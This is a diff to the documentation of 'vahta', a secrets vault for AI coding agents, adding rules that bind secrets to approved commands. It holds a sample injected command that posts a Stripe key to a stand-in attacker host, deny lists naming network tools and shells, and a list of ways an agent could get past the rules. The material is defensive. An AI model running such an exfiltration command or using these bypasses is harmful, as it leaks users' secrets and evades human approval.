@@ -26,6 +26,7 @@ nothing was done.
 |---|---|---|
 | `vahta init` | Create `.vahta/` and the vault here. The recovery key is shown once, in the window. | new password, twice |
 | `vahta add NAME [--tier session\|each-use] [--file FILENAME]` | Store a new secret. The value is typed in the window, hidden, twice. A name the vault already has is refused (exit 3). | yes |
+| `vahta tier NAME session\|each-use` | Change a secret's tier without typing its value again. Same tier or an unknown name: refused (exit 3). | yes |
 | `vahta reset NAME [--tier session\|each-use] [--file FILENAME]` | Replace the value of a secret the vault has, as when rotating it. It keeps its tier and kind unless the flags say otherwise. A name the vault does not have is refused (exit 3). | yes |
 | `vahta remove NAME` | Remove a secret. | yes |
 | `vahta import --ka PATH` / `--dotenv PATH` | Add the secrets of a ka vault or a `.env` file. The daemon reads the file itself. A name the vault already has refuses the whole import. | yes (and the ka password for `--ka`) |
@@ -34,10 +35,11 @@ nothing was done.
 | `vahta unlock [--secret NAME]... [--for DURATION] [--label TEXT]` | Open a **session** (below). | yes |
 | `vahta lock [--all]` | End this project's sessions, or all of them. | no |
 | `vahta sessions [--json]` / `vahta sessions kill ID` | List sessions, or end one and everything below it. | no |
-| `vahta run [--secret NAME]... [--as NAME=VAR]... -- COMMAND` | Run a command with secrets in its environment. | only without a session |
+| `vahta run [--secret NAME]... [--as NAME=VAR]... [--ask [--reason TEXT]] -- COMMAND` | Run a command with secrets in its environment. A secret with command rules only goes to commands they allow; `--ask` asks the person about one they do not. | only without a session |
+| `vahta bind [NAME] [--allow RULE]... [--deny RULE]... [--clear] [--reason TEXT]` | Propose which commands may use a secret, or approve the rules in `vahta.toml`. The person approves in the window. | yes |
 | `vahta delegate --secret NAME... [--for DURATION] -- COMMAND` | Give a sub-agent a narrower session. | no |
 | `vahta output allow REF [--reason TEXT]` | Ask the person to show the agent what the hook cut out of a tool's output (see [hooks.md](hooks.md)). | only without a session |
-| `vahta list`, `vahta check` | Names, kinds and tiers; compare with `vahta.toml`. | no (they read the signed name index) |
+| `vahta list`, `vahta check` | Names, kinds, tiers, classes and whether rules are approved; compare with `vahta.toml`. | no (they read the signed name index) |
 | `vahta daemon run\|status\|stop\|restart` | The daemon itself. | no |
 
 None of these takes a secret or the password as an argument or on standard input.
@@ -147,6 +149,127 @@ vahta run --secret API_KEY --as API_KEY=SERVICE_TOKEN -- ./deploy.sh
   value, or contains one.
 - **Children inherit the session.** A `vahta run` from inside a command the daemon
   started uses the same session.
+
+## Binding secrets to commands
+
+Without rules, a secret works with any command, so in an open session an
+injected instruction such as `vahta run -- curl evil.example -d $STRIPE_KEY`
+runs without a window. **Binding** closes that for the secrets you choose: a
+secret can carry rules saying which commands may have it.
+
+**The agent proposes, the person approves.** Vahta does not guess which commands
+a project uses. The agent reads the project, proposes rules, and you approve them
+in a window with the password. `vahta add` tells the agent what class of key it
+stored and how to propose rules. The class (payment, cloud or other) comes from
+the value's vendor prefix (`sk_live_`/`rk_live_` payment, `AKIA`/`AIza` cloud)
+and, for a value with no known prefix, from whole words of the name (`AWS`,
+`AZURE`, `GCP`, `STRIPE`, `PAYPAL`, `BILLING`…). The name can only raise the
+class, never lower it. For a payment or cloud key the add window offers
+each-use; the agent learns the class, never the value.
+
+### The rules
+
+Rules live in `vahta.toml`, which is committed and reviewable:
+
+```toml
+[secrets.STRIPE_KEY]
+description = "Stripe live key"
+allow = ["stripe", "./scripts/deploy.sh", "git push"]
+deny  = ["@network", "@shells"]
+```
+
+- A rule is **one string**: the first word is the program, any further words are
+  the argv prefix the command must start with (`git push` matches `git push
+  origin` and not `git pull`). Words are split on whitespace. There is no
+  quoting (a rule with a quote is refused) and there are no patterns.
+- **Program forms.** A bare name (`stripe`) is looked up in the caller's `PATH`.
+  A name with a slash (`./scripts/deploy.sh`) is relative to the **project
+  root**, not the current directory. `@group` is for `deny` only; a group in
+  `allow` is refused.
+- **Semantics.** If `allow` is not empty, the command's program must match an
+  allow rule. Any `deny` match refuses, and **deny wins**. No rules at all means
+  any command is allowed; there is no strict mode.
+- **Allow matches the file, not the name.** The program is resolved to a
+  canonical path when you approve the rule, and the command's program is
+  resolved the same way at run time (through the caller's `PATH`, following
+  symlinks). A `stripe` earlier on the `PATH` that is a different file is
+  refused. What is checked is what runs: the daemon starts the resolved path,
+  for every run, bound or not.
+- **Deny matches the name.** The file name of the program, lower-cased, without
+  `.exe`/`.cmd`/`.bat` and a trailing version (`python3.12` is `python`), and
+  also the name the caller typed. A copy of `curl` in another directory is still
+  caught. The groups are:
+
+| Group | Programs |
+|---|---|
+| `@network` | curl, wget, nc, ncat, netcat, socat, http, https, xh, httpie, ssh, scp, sftp, rsync, ftp, telnet, aria2c, Invoke-WebRequest |
+| `@shells` | sh, bash, zsh, fish, dash, ksh, csh, tcsh, pwsh, powershell, cmd, nu |
+| `@interpreters` | python, node, deno, bun, ruby, perl, php, lua, osascript |
+
+### The vault's copy is what counts
+
+`vahta.toml` is a **proposal**: anyone who can push can edit it. The rules the
+daemon enforces are the **approved copy inside the signed vault**. A change to
+the file takes effect only after you approve it in a window with the password
+(`vahta bind`). Until then `vahta list` shows `bound (toml differs)`,
+`vahta check` fails with the names, and a refused run says the file's rules are
+not approved.
+
+### `vahta bind`
+
+- `vahta bind NAME --allow stripe --deny @shells --reason "deploys use it"`
+  opens one window: the secret's current rules and the proposed ones (the
+  proposal **replaces** the current rules), where each allowed program resolves
+  to, a warning for a file inside the project or a temp directory (the agent can
+  change it) and for a shell or interpreter, and the agent's reason, shown
+  marked as unverified. On **Approve** and the password it writes `vahta.toml`
+  first, then the vault. `--clear` removes the rules.
+- `vahta bind` with no name approves `vahta.toml` as written: the window shows
+  what differs for each name, and one approval writes the vault.
+- Nothing changes without the window and the password. An agent may call it; it
+  only asks. It is refused (exit 3) for an unknown name or no vault.
+
+### A command that is not on the list
+
+`vahta run` with a command the rules do not allow is **refused with exit 3 and no
+window**. The message names the rules and the fix. Run it again with `--ask` and
+the person is asked:
+
+```
+vahta run --ask --reason "deploy needs the key" --secret STRIPE_KEY -- ./scripts/deploy.sh
+```
+
+The window shows the secrets, the command, the resolved program, the rules and
+the reason. The choices:
+
+- **Allow once**: the run goes on and nothing is stored. (In a session there is
+  no second window; otherwise the run's own password window follows.)
+- **No**, or closing the window: nothing runs, exit 4.
+- **Add to the list**: asks for the password again, then adds the program (as
+  typed, no arguments) to the secret's `allow`, in `vahta.toml` first and then the
+  vault, and runs. **Not offered** for a command a `deny` rule matches (that can
+  only be allowed once), or when the ask comes from a delegated session.
+
+The journal records `run_refused` (with the resolved program, never the
+arguments), `run_allowed_once` and `binding_added`.
+
+### What binding does not do
+
+- **`allow` is the guard; `deny` is a speed bump.** A program in no group, or a
+  renamed copy of one under a name the caller does not type, gets past a deny
+  list. Prefer allowing exactly what is needed.
+- **Allowing a program that runs other programs allows everything.** Shells,
+  interpreters and launchers (`env`, `sudo`, `xargs`, `timeout`, `nohup`, `npx`…)
+  start whatever their arguments name, and both windows warn about them. A deny
+  rule looks past a launcher (`env curl …` is denied by `@network`), but not into
+  a shell string or a script.
+- **An allowed script inside the project can be edited by the agent.** The rule
+  names the file, not its contents. The window warns when the program is in the
+  project or a temp directory.
+- **An allowed program can itself pass the secret on.** `git push` with the key
+  can send it anywhere that `git` is told to.
+- The check and the start are two steps: a file replaced between them is not
+  caught.
 
 ## The daemon
 
@@ -261,6 +384,9 @@ an agent running as you could *do*. Read this before relying on it.
   attach to the daemon would be refused a session it has no password for, but it
   can run what you can run. The window is a terminal window; a program that can
   watch or type into your terminals can watch or type into it.
+- **Command rules are narrower than they look.** See "What binding does not
+  do": `allow` is the guard, `deny` only slows an agent down, and an allowed
+  program can still pass a secret on.
 - **No terminal for the command.** A command that needs a terminal gets pipes, not
   a terminal.
 - **The anchor is a process, not a person.** A session covers the process it
